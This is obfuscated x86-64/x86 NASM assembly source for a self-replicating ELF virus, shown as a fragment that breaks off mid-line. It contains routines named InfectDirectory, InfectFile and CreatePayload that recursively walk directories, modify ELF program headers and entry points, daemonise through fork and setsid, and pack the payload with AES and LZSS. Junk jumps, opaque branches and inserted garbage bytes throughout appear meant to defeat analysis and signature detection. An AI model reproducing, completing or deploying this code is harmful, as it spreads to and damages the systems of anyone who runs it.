    jne         ..@dHIawrBLtFBt
    add         r2, rax
    mov         r3, QWORD [rsp+_INFFILE_OFF.file+file.filesize]
    js          ..@hM82piRQwEC9
    jns         ..@hM82piRQwEC9
..@N0kBOgNiDcdu:
    sub         al, 0x02
    jmp         $+3
db 0xe0
    jb          ..@miiXUbautGxe
    jae         ..@miiXUbautGxe
..@5XokUOl5o7iT:
    mov         BYTE [r1], 0x00
    jmp         ..@DVQILdxEqNOt
..@cfphLxO3WkK3:
%ifdef X86_32
    mov         ecx, original_virus_len+PADDING
    mov         edx, 11b
%endif
    jmp         $+3
db 0x73
    jl          ..@cJPMJx6ETMqw
    jge         ..@cJPMJx6ETMqw
..@55NVEJPM7lul:
    xchg        rdx, rdx
    ODIR        [rsp+_PROC_OFF.dirfd], [rsp+_PROC_OFF.dirbuf], DIRENT_BUFSIZE
    cmp         rax, 0x00
    jmp         $+5
db 0xdf, 0x17, 0x87
    js          ..@HbNrfnjit5E5
    jns         ..@HbNrfnjit5E5
..@dzM8w53vP8PP:
    je          ..@UjYHNYXphJVA
    js          ..@EQ0XF3CXkcUu
    jns         ..@EQ0XF3CXkcUu
..@gEDzbdDSYf7m:
    lea         r1, [rsp+_PROC_OFF.buffer]
    jmp         $+4
db 0xea, 0xef
    je          ..@uBFh594mNFlw
    jne         ..@uBFh594mNFlw
..@N7rVuYGCH1YG:
    mov         rax, rax
    xor         rax, rax
    je          ..@EWU8DXkyMqpj
    jne         ..@EWU8DXkyMqpj
..@J35L91EjBZ9C:
    mov         r4, r5
    jmp         $+4
db 0xb8, 0xd7
    je          ..@Cmfa5aNk7gLF
    jne         ..@Cmfa5aNk7gLF
..@waIwdapHhdPV:
    syscall
    jmp         $+3
db 0x83
    jmp         $+5
db 0x16, 0x13, 0x69
    jmp         ..@EDlUooOB8iEm
..@jBmpwJcaOWke:
    pop         rsi
    jmp         ..@tOReMYymuVB9
..@YKuzki6SJEhz:
    jmp         ..@jxZ09EzqjX0r
    jmp         $+4
db 0x2c, 0xf6
    jmp         ..@jUXC8eXOk8fw
..@d2nImbnmmwuN:
    jz          ..@amJk22FETKlb
    jmp         $+5
db 0xe2, 0x6c, 0x16
    jmp         $+4
db 0xf6, 0x23
    jmp         $+3
db 0x73
    jmp         $+5
db 0xc2, 0x8b, 0x8f
    jmp         $+3
db 0xad
    jb          ..@gEDzbdDSYf7m
    jae         ..@gEDzbdDSYf7m
..@3TEXmlIHNhMX:
    xor         rax, rax
    js          ..@uAyigwWxcO6J
    jns         ..@uAyigwWxcO6J
..@zQ9qYHFtx7rR:
    sub         rsp, _INFFILE_OFF_size
    mov         QWORD [rsp+_INFFILE_OFF.file+file.filename], r1
    jmp         $+5
db 0xb8, 0xc6, 0x93
    jmp         ..@Xc6yXr3wWCAQ
..@BR7tUzcuywg0:
%ifndef ENABLE_DEBUGGING
    mov         r3d, 0x6
%endif
    js          ..@XhswCnl42Lm2
    jns         ..@XhswCnl42Lm2
..@OnpKgK61JtsF:
    mov         rsi, QWORD [rsp+_DYNPIE_OFF.ptr]
    jl          ..@QnGfZMpSOYny
    jge         ..@QnGfZMpSOYny
..@XqV6jFYAEDqD:
    jg          ..@ni31vuELheSw
    jmp         $+4
db 0xdd, 0x2e
    jmp         ..@QpR9Gm1CrtXm
..@03j2WNmZK2Q7:
    xchg        rsp, rsp
    jmp         $+5
db 0xb7, 0xea, 0xb1
    jmp         ..@dqk1UnGRdEIB
..@tiREhl6NM0Jp:
    lea         r1, [rsp+_INFFILE_OFF.file]
    mov         r2, r4
    call        AddSizeMappedFile
    js          ..@sTbkCs35bSKI
    jns         ..@sTbkCs35bSKI
..@X3bdnrvIVi3z:
    xchg        rcx, rcx
    jmp         $+5
db 0x19, 0xbf, 0x28
    jb          ..@1Ph7BUakAw74
    jae         ..@1Ph7BUakAw74
..@WsfHCzEZZt3d:
    sub         WORD [rsp+_LZSSE_OFF.la_index], WINDOW_LENGTH
    js          ..@zCqic50cQRFm
    jns         ..@zCqic50cQRFm
..@Ut3Kllb3ym1m:
    shr         BYTE [rsp+_LZSSE_OFF.mask], 1
    mov         rdi, rdi
    jmp         $+3
db 0x12
    jb          ..@EXJtuGTFHWEp
    jae         ..@EXJtuGTFHWEp
..@vYQYTVyNQHTB:
    xchg        rbx, rbx
    push        rbx
    pop         rbx
    jmp         $+3
db 0xd9
    je          ..@BbVg62MZRoi6
    jne         ..@BbVg62MZRoi6
..@nsnQ3CtQ5HWW:
    mov         rbp, rsp
    jmp         $+4
db 0x8f, 0x0e
    js          ..@4A76FpVAV1e7
    jns         ..@4A76FpVAV1e7
..@SRU8AkozGR1D:
    lea         r3, [rsp+_PAYLOAD_OFF.key]
    jmp         $+3
db 0xe9
    jl          ..@6FFnFEqsQJcU
    jge         ..@6FFnFEqsQJcU
..@rCZYxujG8mGI:
%ifdef X86_32
    mov         eax, SYS_MMAP2
    int         0x80
%endif
    jmp         $+3
db 0xb6
    jmp         ..@VeplUJOj7lpT
..@bzKV9N6qjmWp:
    jle         ..@PNLKGjNhODCw
    jl          ..@O4hGg3UTMaNG
    jge         ..@O4hGg3UTMaNG
..@03CoQuLOCptz:
    jne         ..@mmaIxPWflqsu
    js          ..@MqDzDTquDiCJ
    jns         ..@MqDzDTquDiCJ
..@dKcrPhTRzelA:
    push        rax
    pop         rax
    mov         rdi, rdi
    js          ..@AWzYC0817nT5
    jns         ..@AWzYC0817nT5
..@o9z9YF1HLLnD:
%ifndef ENABLE_DEBUGGING
    mov         rbp, rbp
    mov         eax, SYS_SETSID
%endif
    jb          ..@gHYA6hPgng03
    jae         ..@gHYA6hPgng03
..@EDlUooOB8iEm:
    push        rdi
    jb          ..@HEyrwJ1stJmX
    jae         ..@HEyrwJ1stJmX
..@it33fxaJ69Qo:
    xor         rax, rax
    js          ..@3oy90WTg4A0c
    jns         ..@3oy90WTg4A0c
..@f7wAHNfpny9K:
    jnz         ..@Y61Jt6wG3DVA
    jmp         $+3
db 0xb7
    je          ..@RMZPGnQapHjJ
    jne         ..@RMZPGnQapHjJ
..@oeRotaY7Z0I5:
    mov         r2, r1
    jb          ..@ByVnd6xn0EDv
    jae         ..@ByVnd6xn0EDv
..@26lCrsuLh4IL:
    mov         rdi, m6
    jmp         ..@IlnOA7Jyr0DY
..@iTjqSmEKurhR:
%ifdef X86_64
    xor         rdx, rdx
%endif
    jmp         $+4
db 0x21, 0x2b
    jb          ..@JyKlABxrNSif
    jae         ..@JyKlABxrNSif
..@JnZnhu50FqyZ:
    jl          ..@qiSJn112LCPC
    jmp         $+4
db 0x46, 0x73
    jmp         ..@60MzoZEdPUAX
..@Xc6yXr3wWCAQ:
    push        rax
    pop         rax
    lea         r1, [rsp+_INFFILE_OFF.file]
    jmp         ..@iTHwWS4VrDKP
..@NE1ohRs2brzR:
%ifdef X86_32
    xor         eax, eax
    xor         ebx, ebx
%endif
    jmp         $+5
db 0x9d, 0xf4, 0x01
    jmp         ..@RWFcrwdgXuEJ
..@g8JTNT8hOTob:
    mov         r2, m5
    call        CreatePayload
    jmp         $+5
db 0xec, 0x23, 0x25
    jl          ..@o8SS0ihquqU1
    jge         ..@o8SS0ihquqU1
..@qGnozVHnMXea:
%ifndef ENABLE_DEBUGGING
    pop         rax
    cmp         al, 0x0
%endif
    jmp         ..@qP9ORkN1FZEU
..@ySH3ANTOxhJq:
    mov         rdi, rdi
    jl          ..@PNLKGjNhODCw
    jge         ..@PNLKGjNhODCw
..@VeplUJOj7lpT:
%ifdef X86_32
    pop         ebp
%endif
    jmp         ..@ZfLPuF6lPfKN
WORDToDWORDASCII:
    jmp         ..@hHuWxktkLiSd
..@mI6wwuA1chAV:
    cmp         rax, 0x00
    jmp         $+3
db 0xdd
    jmp         ..@bzKV9N6qjmWp
..@eunNlfGKXbSy:
    cmp         BYTE [r1+5], '/'
    jne         ..@Y61Jt6wG3DVA
    js          ..@sACOze0guIjG
    jns         ..@sACOze0guIjG
..@ZGwvYCTe1Wa9:
    mov         eax, ebx
    mov         rdi, rdi
    jmp         $+3
db 0xc8
    jl          ..@2QtJVKJ2aFx7
    jge         ..@2QtJVKJ2aFx7
..@mZhVrnUWXxNE:
    pop         r1
    ret
    jmp         $+3
db 0xe6
    jmp         DYNPIEValidation
..@AVTEes2ggyng:
    xchg        rsp, rsp
    jmp         ..@SEKWPJ7tYf1i
..@ZfLPuF6lPfKN:
%ifdef X86_32
    push        rcx
    pop         rcx
    xchg        rdx, rdx
%endif
    jmp         ..@X3bdnrvIVi3z
..@JaBLrgkwCT4G:
    mov         QWORD [r5+file.fileptr], rax
    jmp         $+4
db 0x31, 0x43
    js          ..@YQX2HrpWwwno
    jns         ..@YQX2HrpWwwno
..@zq1oaRVarseO:
    push        rsi
    jb          ..@2tgd2NmLlAN4
    jae         ..@2tgd2NmLlAN4
..@9heiXOGvb21E:
    xchg        rdi, rdi
    syscall
    push        rax
    jmp         $+3
db 0x54
    jmp         $+5
db 0x9a, 0x01, 0xd8
    jl          ..@plWkzPzTLSo7
    jge         ..@plWkzPzTLSo7
..@T4EnXi9erzL6:
    pop         rdi
    js          ..@a3wDrwR2S1Yp
    jns         ..@a3wDrwR2S1Yp
..@VgUf4dKl502m:
    jnz         ..@duECsJg4uPYy
    mov         rsi, rsi
    je          ..@fOteVTZudZGc
    jne         ..@fOteVTZudZGc
..@hM82piRQwEC9:
    push        rbx
    jmp         $+5
db 0x74, 0x9b, 0x9c
    jmp         $+4
db 0xb9, 0x88
    jmp         ..@b6w8ADo7izFg
..@fjUsj57HJri9:
    add         rax, rbx
    jmp         $+3
db 0xfb
    js          ..@LB2JJNCv1iSb
    jns         ..@LB2JJNCv1iSb
..@7KiaLnnvzyui:
    xchg        rsi, rsi
    jmp         $+3
db 0x1e
    jmp         ..@VIRt7xfhUCtD
..@vXeIJmwdBBJa:
    movzx       rax, BYTE [r2]
    jmp         $+5
db 0x5c, 0xfa, 0xc1
    jl          ..@8aE6jjPAn1Or
    jge         ..@8aE6jjPAn1Or
..@DulTC7c5xsUo:
    xor         rax, rax
    mov         ax, WORD [rsp+_DYNPIE_OFF.shentsize]
    jmp         ..@t2jLZiYkaHDm
..@qISwsOb4oG5u:
    xchg        rdx, rdx
    jmp         $+5
db 0x63, 0x16, 0xb5
    jmp         ..@VjG1kRbaj1UZ
..@rbHao6pCWR3S:
    mov         QWORD [r5+file.filesize], rax
    jmp         ..@NE1ohRs2brzR
..@SEKWPJ7tYf1i:
    xchg        rsi, rsi
    jl          ..@JAbnNYxV1Rhf
    jge         ..@JAbnNYxV1Rhf
..@sSos37gTEzX7:
    add         r2, r1
    xor         r4, r4
    jmp         ..@aBCV9tGXDRWw
..@jGRSHu1hvdsD:
    push        r1
    jmp         ..@LwgTdeHoQNrc
..@0QwenZSWqixW:
    mov         rbp, rbp
    je          ..@MnUTWDdadaZh
    jne         ..@MnUTWDdadaZh
..@fInPLVelfVIM:
    je          ..@UjYHNYXphJVA
    cmp         WORD [r1], './'
    je          ..@UjYHNYXphJVA
    jmp         $+5
db 0x12, 0xf9, 0x76
    jmp         $+5
db 0x6a, 0xe3, 0x5e
    je          ..@OF7LDG9HWxjx
    jne         ..@OF7LDG9HWxjx
..@DQfXOyMokIdm:
    pop         rsi
    je          ..@kU1lqE4X9oAq
    jmp         $+3
db 0xa5
    jmp         $+5
db 0xa0, 0x1e, 0xc5
    jmp         ..@niSNHW59xgtA
..@E1AOSFe0dB0u:
    xchg        rsp, rsp
    xor         rax, rax
    CFILE       DWORD [r5+file.filefd]
    jl          ..@087OgNcsMnFp
    jge         ..@087OgNcsMnFp
..@aUMorvRkNRGu:
%ifndef ENABLE_DEBUGGING
    mov         rax, SYS_FORK
    rep         nop
    syscall
%endif
    jmp         $+5
db 0xd0, 0xc5, 0x1c
    js          ..@Z5HKIwZtPvhG
    jns         ..@Z5HKIwZtPvhG
..@nThnUW0y98dV:
    cmp         BYTE [r1+16], ET_DYN
    jmp         ..@NcdO0Pxql9Cv
..@8aE6jjPAn1Or:
    mov         [r1], rax
    jmp         $+3
db 0xe2
    jmp         $+4
db 0x58, 0xd9
    jmp         $+5
db 0xe4, 0xe2, 0x9e
    jl          ..@VUyHKnkGLOWe
    jge         ..@VUyHKnkGLOWe
..@ZAsPpzqbhmqX:
    add         r1, rax
    sub         r1, 1
    cmp         BYTE [r1], DT_DIR
    jmp         $+4
db 0xab, 0x0e
    jmp         $+5
db 0x00, 0xd9, 0xa3
    jmp         $+4
db 0x13, 0xe9
    jmp         $+4
db 0x59, 0xf6
    jb          ..@zB9AamMqINSG
    jae         ..@zB9AamMqINSG
..@r9fSxn3KvO9o:
    push        r1
    mov         r5, r2
    jmp         $+3
db 0x74
    je          ..@dKcrPhTRzelA
    jne         ..@dKcrPhTRzelA
..@xDuxWVwr0Ey0:
    xor         r1, r1
    jb          ..@rDDjyowVZQoc
    jae         ..@rDDjyowVZQoc
..@4RBAJgbgcYTv:
    push        r4
    push        r5
    cmp         r3, 0x00
    jmp         $+3
db 0xb4
    jmp         ..@z12d72nSzIsv
..@el7yE5GhAUTf:
    xor         rcx, rcx
    jmp         $+4
db 0xea, 0x7c
    jmp         ..@xmTPl0CNlKLz
..@zEZaLMiDHk9G:
    jle         ..@amJk22FETKlb
    jb          ..@mlaOSeOO0ijz
    jae         ..@mlaOSeOO0ijz
..@rUIeUkGCX0e7:
    xor         r3, r3
    jb          ..@i2zsWIqpZap5
    jae         ..@i2zsWIqpZap5
..@9S07vIcmOYxz:
    cmp         rcx, QWORD [rdi+s_h.sh_size]
    jge         ..@eQguYNCgXvyu
    jb          ..@GXQPVeoe6mj1
    jae         ..@GXQPVeoe6mj1
..@KQFgRzGdz9XJ:
    jz          ..@AePV1v98LOQu
    jmp         ..@T6cE3V69osrT
..@2tgd2NmLlAN4:
    push        rsi
    pop         rsi
    jmp         $+5
db 0xf8, 0x18, 0xcb
    jb          ..@d1jdPH6O65Cg
    jae         ..@d1jdPH6O65Cg
..@JyKlABxrNSif:
%ifdef X86_64
    xor         r9, r9
    mov         rsi, original_virus_len+PADDING
    mov         edx, 11b
%endif
    jb          ..@z3zsvtrcLaQn
    jae         ..@z3zsvtrcLaQn
..@V3rbJmx5xkkT:
%ifndef ENABLE_DEBUGGING
    mov         r2, rsp
    mov         r3d, 0x10
%endif
    jmp         $+5
db 0xe4, 0x41, 0xa8
    je          ..@qqHtEJkba2cz
    jne         ..@qqHtEJkba2cz
..@iXtu9UwwOv3v:
    pop         rdx
    xor         rax, rax
    xor         r1, r1
    jmp         $+4
db 0xc3, 0x8f
    jmp         $+5
db 0x71, 0xc4, 0x1c
    je          ..@GByQId96Gu7j
    jne         ..@GByQId96Gu7j
..@koNinxZAnM6H:
    jmp         ..@S5MFFLoLvXEp
    jb          ..@Ahe3hQ9T78At
    jae         ..@Ahe3hQ9T78At
..@5gPeA0TbTSo6:
    mov         eax, SYS_MREMAP
    syscall
    cmp         rax, 0xffffffffffffffff
    jmp         ..@hc8FiVpaVd6L
..@8tHhqYSZCZwC:
    mov         r2, rax
    mov         rax, SYS_FTRUNCATE
    jmp         $+3
db 0x4b
    jmp         $+3
db 0x57
    jmp         ..@fck2HvvCpBIa
..@XzRIOVhtrlK9:
    mov         DWORD [rdi], eax
    js          ..@OZEVB6o1bGVW
    jns         ..@OZEVB6o1bGVW
..@mkcd17n3Pt4g:
    aesenc      xmm0, xmm1
    movdqu      xmm1, oWORD [rsp+0xa0]
    aesenc      xmm0, xmm1
    jmp         $+5
db 0xe2, 0x5a, 0x2f
    jb          ..@qoP4y0R4FTdg
    jae         ..@qoP4y0R4FTdg
..@Q6S5GKR3cODH:
    cmp         r1, 0x00
    jg          ..@mmaIxPWflqsu
    jmp         ..@5mMv771HpNhX
..@yjkLuwF1r98O:
    add         rsp, _INFDIR_OFF_size
    ret
    js          InfectFile
    jns         InfectFile
..@vbrTBRi7njIQ:
    pop         rdi
    mov         rax, rax
    jl          ..@EtpGIhrIbSPm
    jge         ..@EtpGIhrIbSPm
..@in51rVOwgEzA:
    mov         rdi, rdi
    jbe         ..@mymCsB7aJM40
    jmp         $+3
db 0x97
    je          ..@vxqF6P6ggX8o
    jne         ..@vxqF6P6ggX8o
..@jDZBYjJ1Guab:
    mov         QWORD [r2+p_h.p_paddr], r3
    mov         QWORD [r2+p_h.p_filesz], r4
    jmp         $+3
db 0x31
    jmp         ..@gwjQtQXFn4nx
..@uQFJUY0Lnl9k:
%ifndef ENABLE_DEBUGGING
    xor         r2, r2
%endif
    jmp         $+4
db 0x2b, 0x06
    jb          ..@HOXbvCBkbI80
    jae         ..@HOXbvCBkbI80
..@fLYPcxwuru5h:
    jle         ..@zsINgtGROFAC
    push        r1
    jl          ..@dt99oCFSoHAh
    jge         ..@dt99oCFSoHAh
..@F67IsYYh3JOq:
    mov         r5, [rsp]
    push        rcx
    pop         rcx
    jl          ..@JaBLrgkwCT4G
    jge         ..@JaBLrgkwCT4G
..@90aXdMlHmQAL:
    cmp         bx, WORD [rsi+e_h.e_shnum]
    jb          ..@nMzIFvClPDHc
    jae         ..@nMzIFvClPDHc
..@AJCznaqHBtG7:
    jl          ..@pVbganjwP8Pk
    je          ..@ingYVTEp0XeF
    jne         ..@ingYVTEp0XeF
..@roZex2SUEzRp:
    or          bx, dx
    jb          ..@wr2Tci2WFHjL
    jae         ..@wr2Tci2WFHjL
..@zG5v34hFby7T:
    mov         al, BYTE [rsp+_LZSSE_OFF.bits]
    mov         rdi, QWORD [rsp+_LZSSE_OFF.outputaddr]
    mov         BYTE [rdi], al
    jb          ..@F92VNhWKybFz
    jae         ..@F92VNhWKybFz
..@jDrUxz4SeW8g:
    xor         rax, rax
    jmp         ..@KFDxoSYXfNzc
InfectDirectory:
    jmp         ..@hq9dxzlSmG8k
InfectionRoutine:
    jmp         ..@X6kEbCE823Iu
..@s64jktIXl3wm:
    sub         rsp, _AESE_OFF_size+0x100
    js          ..@FpCI4ho6rtC5
    jns         ..@FpCI4ho6rtC5
..@W626EXZMbK5l:
    jne         ..@0Y1FJiNQJXUt
    jmp         $+5
db 0x04, 0xae, 0xe2
    jmp         ..@fyY9KkyZLmjI
..@UZGPe6rCivAD:
    rep         nop
    jmp         $+4
db 0x51, 0x3c
    jb          ..@nC7HOHi4ixyE
    jae         ..@nC7HOHi4ixyE
..@eUIPJhexYDrE:
    mov         r1, r5
    call        IsELFComplete
    jmp         ..@kLMC9l4UaZwa
..@806qeX226HUb:
    cmp         cl, 0x4
    jmp         ..@Eenpk4mT6Zu1
..@kDzq8wkcCnN1:
    pop         rax
    jz          ..@ZadmL0lbLgJj
    add         r4, r3
    jmp         $+4
db 0x5a, 0x05
    jmp         $+5
db 0xc2, 0xf0, 0x72
    jmp         $+3
db 0x90
    jb          ..@FNvkNnwrQhPc
    jae         ..@FNvkNnwrQhPc
..@IFaBmhvpgtab:
    cmovg       ecx, DWORD [rsp+_LZSSE_OFF.length]
    sub         QWORD [rsp+_LZSSE_OFF.length], rcx
    jl          ..@HUqvubrdGN8r
    jge         ..@HUqvubrdGN8r
..@Ibk8WB6kLbuj:
    mov         rbx, rbx
    js          ..@gxWRhbUzAC7e
    jns         ..@gxWRhbUzAC7e
..@miiXUbautGxe:
    mov         edx, 1
    shl         edx, POSITION_BITS+LENGTH_BITS
    jmp         $+3
db 0x45
    jmp         $+4
db 0x06, 0x2c
    jb          ..@DsTKCpaXpKiC
    jae         ..@DsTKCpaXpKiC
..@1ySGS5upWU18:
    aesenc      xmm0, xmm1
    jmp         $+4
db 0x95, 0x56
    jmp         $+4
db 0x56, 0x80
    jmp         ..@FtXjOYFyMmx1
..@TA1POBWyFS6N:
    call        GetNewProgramVaddr
    jmp         $+4
db 0x44, 0xab
    jmp         ..@dsULph2Rzqe0
..@t2jLZiYkaHDm:
    mul         rbx
    mov         rdi, QWORD [rsp+_DYNPIE_OFF.sh_ptr]
    add         rdi, rax
    jmp         $+4
db 0x92, 0x2b
    jmp         ..@OnpKgK61JtsF
..@VIRt7xfhUCtD:
    aesenc      xmm0, xmm1
    movdqu      xmm1, oWORD [rsp+0x70]
    aesenc      xmm0, xmm1
    jmp         $+5
db 0xbe, 0x7c, 0x84
    jmp         $+3
db 0xa2
    jmp         $+4
db 0x23, 0x4c
    jl          ..@WwTGrYawrHXA
    jge         ..@WwTGrYawrHXA
..@507MMoXYsQtw:
    jmp         ..@UjYHNYXphJVA
    jmp         ..@1MfVbZBJ9tkB
..@If5h7FC06SaU:
    inc         QWORD [rsp+_LZSSE_OFF.outputaddr]
    jl          ..@kjAqQcZ29KqU
    jge         ..@kjAqQcZ29KqU
..@YXWscK47AZBt:
    push        rdi
    pop         rdi
    jmp         ..@EWU8DXkyMqpj
    jmp         ..@ni31vuELheSw
..@4Sz16hqk88cX:
    sub         rsp, _PROC_OFF_size
    jmp         $+4
db 0xa6, 0xd8
    jl          ..@0QwenZSWqixW
    jge         ..@0QwenZSWqixW
..@O1w0lWJLB82U:
%ifdef X86_32
    mov         edi, 0xffffffff
%endif
    js          ..@3PXY7qbh9z3Q
    jns         ..@3PXY7qbh9z3Q
..@b6U6JNjTwoIa:
    push        rsi
    jmp         $+3
db 0xd5
    jb          ..@dbrgCjecixuy
    jae         ..@dbrgCjecixuy
..@PQbEeluPWU2V:
    pop         rdx
    jmp         $+5
db 0xb3, 0xce, 0xf8
    jmp         $+3
db 0xa8
    jl          ..@coZzfdfTR3XQ
    jge         ..@coZzfdfTR3XQ
..@733yiTkb6cLg:
    mov         rbp, rbp
    jmp         $+4
db 0x2f, 0x00
    js          ..@jcUJW61m8wzw
    jns         ..@jcUJW61m8wzw
..@OehkXiEh7Zty:
    jmp         ..@xSh40Y0kVmwL
    jb          ..@mymCsB7aJM40
    jae         ..@mymCsB7aJM40
..@JtPz8Swf6sOo:
%ifndef ENABLE_DEBUGGING
    mov         r2d, 0x2
%endif
    jmp         $+4
db 0xee, 0x80
    jmp         ..@0WBXGIc6DeBw
..@RV1EfHo1X6Pc:
    push        rdi
    pop         rdi
    mov         r2, QWORD [r5+file.filesize]
    jmp         ..@t0oYsh3H06tt
..@ni31vuELheSw:
    xor         rax, rax
    jmp         $+4
db 0xc0, 0x01
    jmp         ..@oppwM1q9hr8c
..@UBofSKnhLrkL:
    call        Strcpy
    jmp         $+4
db 0xe7, 0xcd
    jmp         ..@magC6Y9iuFUq
..@coZzfdfTR3XQ:
    mov         rsp, rsp
    movdqu      xmm1, oWORD [rsp+0xb0]
    jmp         $+4
db 0x60, 0x00
    je          ..@1ySGS5upWU18
    jne         ..@1ySGS5upWU18
..@0qGNzsXx4Y3Z:
    push        r1
    push        r2
    jmp         $+4
db 0xaa, 0x4d
    jl          ..@TDKsqjJBlrvx
    jge         ..@TDKsqjJBlrvx
..@ZWNSsWETpqJE:
    mov         r2, QWORD [r1+file.filename]
    mov         r4, r5
    jb          ..@VmfTOQbYua55
    jae         ..@VmfTOQbYua55
..@1uRnNk3neClr:
    movdqu      xmm1, oWORD [rsp+0x40]
    xchg        rbx, rbx
    je          ..@WSuscCFOV24C
    jne         ..@WSuscCFOV24C
..@ss4viDFdQ7Zv:
    mov         DWORD [r5+file.filefd], 0x00
    jmp         $+3
db 0xe0
    js          ..@cTkbhibWtnGs
    jns         ..@cTkbhibWtnGs
..@eEoHNbpM3HjC:
    mov         rcx, rcx
    jmp         $+4
db 0x5a, 0x28
    jmp         $+5
db 0xcf, 0x26, 0x0e
    je          ..@I13Hc30jIqM1
    jne         ..@I13Hc30jIqM1
..@WMVTpEoNrN9a:
    mov         rax, 2
    ret
    jmp         ..@Y61Jt6wG3DVA
..@OF7LDG9HWxjx:
    mov         r2d, DWORD [r1]
    jmp         $+5
db 0x34, 0x0a, 0xe8
    js          ..@yL5U051dLo2e
    jns         ..@yL5U051dLo2e
..@yL5U051dLo2e:
    and         r2, 0x00ffffff
    jmp         $+4
db 0xee, 0x6f
    jmp         $+5
db 0x88, 0xc9, 0xd2
    jmp         ..@KhQxAiJYwPr7
..@EKgobsayfOGJ:
    jne         ..@eQguYNCgXvyu
    xor         rcx, rcx
    jl          ..@iMLzDBEdyVIX
    jge         ..@iMLzDBEdyVIX
..@digXFuKZGANM:
    and         eax, 0xff
    jl          ..@XMqfck0FQgkf
    jge         ..@XMqfck0FQgkf
..@i10jjGSV5BV9:
    mov         bx, WORD [rsp+_LZSSE_OFF.la_index]
    jmp         ..@0Y1FJiNQJXUt
    jmp         ..@eyJZt2aKc7ZC
..@FiN641rzbiQk:
    mov         r2, m5
    jmp         $+3
db 0x0a
    jmp         ..@99pxq7L518JH
..@SkBMUeGTieSE:
    push        rbx
    js          ..@OZHUXxCCd5Ix
    jns         ..@OZHUXxCCd5Ix
..@jaiR4Nm3qFWk:
    mov         r2b, BYTE [rsp+_INFDIR_OFF.depth]
    add         r2, 1
    call        InfectDirectory
    js          ..@507MMoXYsQtw
    jns         ..@507MMoXYsQtw
..@uYfWMCpnzVlL:
    call_vsp    Strncmp
    jmp         ..@YdZmkBzTno5f
..@SCpPFT4Ohyew:
    push        r1
    jmp         $+3
db 0xca
    jl          ..@eAZ7kuPA6EXL
    jge         ..@eAZ7kuPA6EXL
..@duECsJg4uPYy:
    shr         edx, 1
    jmp         $+3
db 0x91
    jmp         $+3
db 0x6d
    jmp         ..@QtNMTbJ6VVJO
..@xqWoKJa0D5DP:
%ifndef ENABLE_DEBUGGING
    xor         r3, r3
%endif
    jmp         $+3
db 0x13
    jb          ..@gQclZ7pwHouP
    jae         ..@gQclZ7pwHouP
..@TI0vdDj1dsQq:
    xor         rax, rax
    mov         ax, WORD [r5+e_h.e_shentsize]
    mul         r2
    jmp         $+3
db 0x0c
    jmp         ..@maVfORBfFvbY
..@NMM5eYzBckNC:
    pop         rsi
    mov         rdx, rdx
    mov         rax, SYS_GETUID
    js          ..@waIwdapHhdPV
    jns         ..@waIwdapHhdPV
..@xSh40Y0kVmwL:
    pop         r5
    jmp         $+4
db 0x1e, 0x64
    jmp         ..@huwABAA6dq8b
..@uXXzdsTGdbaP:
    mov         r5, QWORD [r4+rax+p_h.p_vaddr]
    jb          ..@E1iFyb5DgzLF
    jae         ..@E1iFyb5DgzLF
..@MC0y9D3dPQrM:
%ifndef ENABLE_DEBUGGING
    xor         r2, r2
%endif
    jl          ..@xqWoKJa0D5DP
    jge         ..@xqWoKJa0D5DP
..@AHTBKrw9azKx:
    mov         r2, original_virus_len+PADDING
    mov         eax, SYS_MUNMAP
    jmp         $+3
db 0x04
    js          ..@L3DshC5GdBRS
    jns         ..@L3DshC5GdBRS
..@2wb6ApJbrNem:
    mov         rax, rax
    js          ..@vbrTBRi7njIQ
    jns         ..@vbrTBRi7njIQ
..@BHt9ailRWq4V:
    call        UpdateSignature
    jb          ..@osysrPRlQxOq
    jae         ..@osysrPRlQxOq
..@ad1Mt94SS9Zo:
    push        rbx
    js          ..@et3Gu69QRuZ2
    jns         ..@et3Gu69QRuZ2
..@d2ThjTBLfzc2:
    mov         r2w, WORD [rsp+_NBF_OFF.index]
    xchg        rdi, rdi
    jmp         $+3
db 0xff
    jmp         $+3
db 0xe3
    jmp         ..@bPOeh5px5sEh
..@5l1xsOu3xy8B:
    sub         dl, cl
    jmp         ..@1tOE1jzJiv4Y
..@FFrcNFMlrf9R:
    push        rdx
    jmp         ..@niwFsDMeARfC
..@T8Pj2yHibNxB:
    xor         rax, rax
    jl          ..@quDXqCtxsEfP
    jge         ..@quDXqCtxsEfP
..@OhVzH3hXQ8vu:
    OFILE       [r1], 0x10000
    mov         rdi, rdi
    jmp         $+5
db 0x5c, 0x83, 0x5e
    js          ..@Dusd5vaRc4Qs
    jns         ..@Dusd5vaRc4Qs
..@Ipxk7TzMULDo:
    mov         r1, QWORD [r5+e_h.e_shoff]
    js          ..@QQ9PFwBhvqxW
    jns         ..@QQ9PFwBhvqxW
..@GaAS9JcJ4Hu7:
    xor         r1, r1
    jmp         $+4
db 0xd6, 0x8d
    jmp         $+4
db 0x30, 0x92
    jl          ..@qFrxvCCxA7av
    jge         ..@qFrxvCCxA7av
..@KtzAqjqUVv38:
    sub         r4, QWORD [r1+e_h.e_entry]
    jb          ..@gc2hv4lfnI0F
    jae         ..@gc2hv4lfnI0F
..@RqnlDVNQgIwx:
    mov         r3, original_virus_len-non_packed_len
    jmp         $+4
db 0xa5, 0x64
    je          ..@1ipYddyUlCuA
    jne         ..@1ipYddyUlCuA
..@bPOeh5px5sEh:
    mov         r3d, DWORD [rsp+_NBF_OFF.key]
    call        UpdateSignature
    mov         r1, QWORD [r5+file.fileptr]
    je          ..@tFQB3mBgoeMV
    jne         ..@tFQB3mBgoeMV
..@fQh082PFW3Dc:
    pop         rdx
    jmp         $+4
db 0x9b, 0x37
    jb          ..@qISwsOb4oG5u
    jae         ..@qISwsOb4oG5u
..@e7oApdnIGb3w:
    push        0x00
    push        rsi
    je          ..@NMM5eYzBckNC
    jne         ..@NMM5eYzBckNC
..@IyxnsZwMEkf5:
    mov         dl, BYTE [rsp+_LZSSE_OFF.cmp_len]
    mov         rbx, rbx
    jmp         $+4
db 0xec, 0x4d
    jl          ..@5l1xsOu3xy8B
    jge         ..@5l1xsOu3xy8B
..@RMZPGnQapHjJ:
    push        rsi
    jmp         ..@jBmpwJcaOWke
..@gHYA6hPgng03:
%ifndef ENABLE_DEBUGGING
    syscall
    mov         rax, SYS_FORK
    syscall
%endif
    jmp         ..@bZw0ScEEjDLH
..@cJPMJx6ETMqw:
%ifdef X86_32
    mov         esi, 0x22
%endif
    jmp         $+4
db 0xb0, 0xe0
    js          ..@O1w0lWJLB82U
    jns         ..@O1w0lWJLB82U
..@MqDzDTquDiCJ:
    cmp         BYTE [r1+4], ELFCLASS
    jmp         ..@ojQecUbbYoPw
..@JuEncGkcfPho:
%ifdef X86_64
